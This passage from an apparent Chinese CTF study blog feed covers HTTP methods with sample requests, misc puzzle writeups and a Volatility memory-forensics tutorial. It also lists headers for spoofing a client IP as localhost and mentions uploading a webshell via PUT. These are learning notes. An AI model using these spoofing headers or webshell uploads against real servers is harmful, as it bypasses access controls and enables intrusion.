alt="image-20240725221139596"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221627896.png" alt="image-20240725221627896"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221646423.png" alt="image-20240725221646423"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http协议</title>
      <link href="/posts/54593785.html"/>
      <url>/posts/54593785.html</url>
      
        <content type="html"><![CDATA[<h2 id="请求头部">请求头部</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0464489901B424F4BD80FAE602DAA329.png" alt="0464489901B424F4BD80FAE602DAA329"></p><h2 id="响应信息">响应信息</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/88cd158c644c5aab7b118242b20e16c6.jpg" alt=""></p><h2 id="状态码">状态码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c61e505210b15862655124f3055a1ac2.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/47e6fb5606c0554ef91cb5ee4d216893.jpg" alt=""></p><p>403状态码表示服务请求被禁止，这一类返回码并不代表目标目录真的 无法访问，很多时候是因为攻击者没有命中正确的资源名称。例如， 通常情况下，上传文件往往存储在upload目录下(具体名称并不绝 对)，如果直接访问upload目录，会返回403错误;但如果访问upload 目录下的具体文件，且该文件确实存在，那么返回的HTTP状态码为 200。此外，403错误也可能是因为参数错误而导致的。因此，如果 HTTP返回码为403，并不意味着该文件不存在，还需要进一步处理， 例如在该目录下继续进行目录探测，或者进行参数爆破。</p><h2 id="请求方法（put方法上传一句话木马）">请求方法（put方法上传一句话木马）</h2><p>put方法上传一句话木马，然后用蚁剑链接。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f5448d7940feb1efbdb1c4d7f7d7fce9.jpg" alt=""></p><p>补充：http的请求方法：</p><p>在 HTTP/1.1 中提供了一系列方法以便我们向服务器发送不同类型的请求，需要注意的是这些方法名称都是区分大小写的，而且必需使用大写字母。具体的方法名称和说明如下表所示：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240915140840152.png" alt="image-20240915140840152"></p><ol><li>GET方法<br>GET 方法可以根据请求行中 URL 部分的参数从服务器中获取数据。例如我们在浏览器中打开一个连接，然后就会在浏览器看到相应的页面，这一过程就是通过 GET 方法实现的。另外，使用 GET 方法还可以在 URL 参数中携带一些字符串类型的参数一同传输给服务器，由于是在 URL 中携带的参数，我们可以在浏览器的地址栏直观的看到，所以安全性较低，一般只用来传递一些没有风险的数据。而且 GET 方法对于所传输数据的大小也有限制，一般不能超过 2kb。</li></ol><p>以访问 <a href="http://www.csdn.net/hello.html">http://www.csdn.net/hello.html</a> 这个页面为例，客户端使用 GET 方法发起的 HTTP 请求如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /hello.html HTTP/1.1</span><br><span class="line">Host: www.csdn.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><p>针对上面的请求，服务器的响应如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Tengine</span><br><span class="line">Last-Modified: Thu, 17 Sep 2020 13:07:28 GMT</span><br><span class="line">ETag: &quot;34aa387-d-1568eb00&quot;</span><br><span class="line">Vary: Authorization,Accept</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 68</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Connection: Closed</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello，CSDN！&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>HEAD方法<br>HEAD 方法在功能上与 GET 方法相似，不同之处在于使用 HEAD 方法服务器只会返回响应行和响应头，不会返回响应体。同样以访问 <a href="http://c.biancheng.net/hello.html">http://c.biancheng.net/hello.html</a> 这个页面为例，客户端使用 HEAD 方法发起的 HTTP 请求如下所示：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HEAD /hello.html HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Host: www.csdn.net</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><p>针对 HEAD 方法发起的请求，服务器的响应如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Tengine</span><br><span class="line">Last-Modified: Thu, 17 Sep 2020 13:07:28 GMT</span><br><span class="line">ETag: &quot;34aa387-d-1568eb00&quot;</span><br><span class="line">Vary: Authorization,Accept</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Connection: Closed</span><br></pre></td></tr></table></figure><p>通过服务器的响应结果可以看出，服务器在返回了响应行和响应头之后，并没有返回响应体。</p><p>3.POST方法<br>当我们需要将一些信息发送给服务器的时候就需要用到 POST 方法了，比如在提交表单或者上传文件的时候。与 GET 方法不同，POST 方法会将返送给服务器的信息放到请求体中，所以比 GET 方法更加安全。而且，POST 方法对于传输数据的大小和类型也没有限制。以提交表单为例，使用 POST 方法向服务器发起的 HTTP 请求如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Host: c.biancheng.net</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">Content-Length: 40</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">username=www.csdn.net&amp;password=123456</span><br></pre></td></tr></table></figure><p>上面的请求发送成功后，服务器端的脚本 login.php 会根据传递的数据做出相应的处理，并对客户端做出响应，响应结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Server: Tengine</span><br><span class="line">Last-Modified: Thu, 17 Sep 2020 13:07:28 GMT</span><br><span class="line">ETag: &quot;34aa387-d-1568eb00&quot;</span><br><span class="line">Vary: Authorization,Accept</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 51</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Connection: Closed</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;登陆成功&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>PUT方法<br>使用 PUT 方法将数据传输到服务器，并将其存储在 URL 所指定的位置。假如我们要将 hello.html 文件的内容存储到服务器的根目录下，那么客户端发送的 HTTP 请求应该是下面这样的：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /hello.html HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Host: www.csdn.net</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-Length: 182</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Hello，CSDN！&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这时服务器会在根目录下创建 hello.html 文件，并将请求中传输的数据保存到这个文件中，执行成功后会向客户端做出如下所示的响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 201 Created</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Server: Tengine</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 30</span><br><span class="line">Connection: Closed</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;The file was created.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>DELETE方法<br>DELETE 方法可以请求服务器删除 URL 所指定的文件。假如要删除上面操作中在服务器根目录创建的 hello.htnl 文件，那么客户端的请求应该是下面这样的：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DELETE /hello.html HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Host: www.csdn.net</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><p>服务器在收到上面的请求后，会删除根目录下的 hello.html 文件，并对客户端做出如下响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Server: Tengine</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 30</span><br><span class="line">Connection: Closed</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;URL deleted.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>CONNECT方法<br>客户端使用 CONNECT 方法可以与 URL 所指向的目标服务器建立 HTTP 连接。假如要与域名（<a href="http://c.biancheng.net">c.biancheng.net</a>）所指向的服务器建立连接，客户端的请求如下所示：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONNECT www.csdn.net HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br></pre></td></tr></table></figure><p>连接建立成功后，服务器会对客户端做出如下响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 Connection established</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Server: Tengine</span><br></pre></td></tr></table></figure><ol start="7"><li>OPTIONS方法<br>当我们要使用本节中介绍的某个方法向服务器发送请求，但又不确定服务器是否支持此请求时，可以使用 OPTIONS 方法来查看服务器所支持的 HTTP 方法。在使用 OPTIONS 方法发送 HTTP 请求时，既可以指定具体的 URL，也可以使用星号（*）来代表整个服务器。假如要查看域名（<a href="http://c.biancheng.net">c.biancheng.net</a>）所指向服务器所支持的 HTTP 方法，客户端的请求如下所示：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS * HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br></pre></td></tr></table></figure><p>服务器的响应如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Server: Tengine</span><br><span class="line">Allow: GET,HEAD,POST,OPTIONS,TRACE</span><br><span class="line">Content-Type: httpd/unix-directory</span><br></pre></td></tr></table></figure><p>在服务器返回的响应头中，Allow 一行就是该服务器支持的所有 HTTP 方法。</p><ol start="8"><li>TRACE方法<br>服务器在收到客户端使用 TRACE 方法发送的 HTTP 请求时，会将收到的请求报文放到响应体中返回给客户端。TRACE 方法主要在程序的开发测试阶段使用，使用 TRACE 方法可以查看请求在传递到服务器的过程中是否被篡改或破坏等等。客户端的请求示例如下所示：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TRACE / HTTP/1.1</span><br><span class="line">Host: www.csdn.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br></pre></td></tr></table></figure><p>服务器的响应如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line">Server: Tengine</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: message/http</span><br><span class="line">Content-Length: 166</span><br><span class="line"></span><br><span class="line">TRACE / HTTP/1.1</span><br><span class="line">Host: www.csdn.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safar</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪造ip</title>
      <link href="/posts/c8350c89.html"/>
      <url>/posts/c8350c89.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/E4E031DFCC2307D704B826E01515BC05.png" alt="E4E031DFCC2307D704B826E01515BC05"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Forwarded-For:localhost</span><br><span class="line"></span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line"></span><br><span class="line">Forwarded:localhost</span><br><span class="line"></span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Custom-IP-Authorization:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Forwarded-For：127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Forward:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Forward:localhost</span><br><span class="line"></span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Forwarded-Host:localhost</span><br><span class="line"></span><br><span class="line">X-HTTP-Host-Override:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Oriainatina-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line"></span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">True-Client-Ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.24</title>
      <link href="/posts/e4f115d7.html"/>
      <url>/posts/e4f115d7.html</url>
      
        <content type="html"><![CDATA[<h2 id="你会异或吗">你会异或吗</h2><p>将文件下载解压放进010editor，发现格式不对，根据题目提示“你会异或吗”和“0x50”，在010editor中对每个字节与0x50进行异或运算，得到完整图片。</p><h2 id="flag一分为二">flag一分为二</h2><p>解压文件是一张png图片，放进010editor，运行模板中的png，在模板结果中找到宽高并修改。之后再用隐形水印工具提取盲水印。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724183731995.png" alt="image-20240724183731995"></p><h2 id="you-and-me">you_and_me</h2><p>两张图，猜测you.png是原图，you_and_me是加了盲水印的图，需要原图的提取盲水印想到blind watermark。（watermark解不出来）</p><h2 id="黑丝白丝还有什么丝">黑丝白丝还有什么丝</h2><p>视频里按照黑丝白丝出现的顺序和转场变化，依次记录，（白黑黑、白白白白黑、黑白、黑、黑、黑黑黑黑黑、黑白白白、白白白黑黑、黑黑、黑黑黑、白黑白、白、黑白黑白、白白黑、黑、白、白白。最后两个白白应该是拜拜的意思）然后放进</p><p>摩斯密码解密。（多来点这种题（手动滑稽））</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724224604185.png" alt="image-20240724224604185"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volayility工具的使用方法</title>
      <link href="/posts/bf034aea.html"/>
      <url>/posts/bf034aea.html</url>
      
        <content type="html"><![CDATA[<h3 id="获取内存镜像详细信息">获取内存镜像详细信息</h3><p>imageinfo 是 Volatility 中用于获取内存镜像信息的命令。它可以用于确定内存镜像的操作系统类型、版本、架构等信息，以及确定应该使用哪个插件进行内存分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw imageinfo  #f：指定分析的内存镜像文件名</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3422e6b9f4134545b38e28f440bf4b43.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上述输出中，Suggested Profile(s) 显示了 Volatility 推荐的几个内存镜像分析配置文件，可以根据这些配置文件来选择合适的插件进行内存分析</span><br><span class="line">AS Layer2 显示了使用的内存镜像文件路径</span><br><span class="line">KDBG 显示了内存镜像中的 KDBG 结构地址</span><br><span class="line">Number of Processors 显示了处理器数量</span><br><span class="line">Image Type 显示了操作系统服务包版本</span><br><span class="line">Image date and time 显示了内存镜像文件的创建日期和时间</span><br></pre></td></tr></table></figure><h3 id="获取正在运行的程序">获取正在运行的程序</h3><p>这里我们用 Win7SP1x64 配置文件进行分析，Volatility 的 pslist 插件可以遍历内存镜像中的进程列表，显示每个进程的进程 ID、名称、父进程 ID、创建时间、退出时间和路径等信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/45abecfd68f44f519f29117157ed8202.png" alt="img"></p><h3 id="提取正在运行的程序">提取正在运行的程序</h3><p>Volatility 的 procdump 插件可以根据进程 ID 或进程名称提取进程的内存映像，并保存为一个单独的文件</p><p>比如这里我要提取 iexplore.exe 这个程序</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/91b4b7d94a0941bb847d2ca1dd718e20.png" alt="img"></p><p>他的进程 pid 号为 2728</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 procdump -p 2728 -D ./</span><br><span class="line">p：pid进程号</span><br><span class="line">D：提取程序后保存的地址，./指的是当前shell正在运行的文件夹地址，输入pwd命令可以查看shell当前的地址，简单来说就是保存到当前文件夹</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/44983433c85949ea973d4a8847f83c80.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7cc5cb6ea5894a01af7d2f43b43c4e12.png" alt="img"></p><p>成功导出，导出后文件名为 executable.2728.exe</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/75235b0e2ab8468ba0d9bf89c226c2ec.png" alt="img"></p><h3 id="查看在终端里执行过的命令">查看在终端里执行过的命令</h3><p>Volatility 的 cmdscan 插件可以扫描内存镜像中的进程对象，提取已执行的 cmd 命令，并将其显示在终端中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1a294e3353534d53acfbc4d681935203.png" alt="img"></p><p>他移动到了 Documents 目录下，echo 了一次字符串，然后创建了一个名为 hint.txt 的文件</p><h3 id="查看进程在终端里运行的命令">查看进程在终端里运行的命令</h3><p>Volatility 中的 cmdline 插件可以用于提取进程执行的命令行参数和参数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/63133cffd6c6438d8dac28a7fdec6a33.png" alt="img"></p><h3 id="查找内存中的文件">查找内存中的文件</h3><p>Volatility 的 filescan 插件可以在内存中搜索已经打开的文件句柄，从而获取文件名、路径、文件大小等信息</p><p>我想找到 hint.txt 文件，可以使用以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 filescan | grep hint.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ae18212c27504c8886f86feb340466cc.png" alt="img"></p><p>grep 是 Linux 下常用的命令之一，它用于在文件中查找指定的字符串，并将包含该字符串的行输出</p><p>如果只使用 filescan 而不配合 grep 的话，Volatility 就会输出系统上的全部文件，例如：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6d3fc9ae14074b72b91684b01cbd91a2.png" alt="img"></p><h3 id="提取内存中的文件">提取内存中的文件</h3><p>Volatility 的 dumpfiles 插件可以用来提取系统内存中的文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a780dec2b2984df5b323dee8912e744f.png" alt="img"></p><p>这里我要提取 hint.txt 文件，hint.txt 的内存位置为 0x000000011fd0ca70，这两个由于位置都一样，随便提取哪个都行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 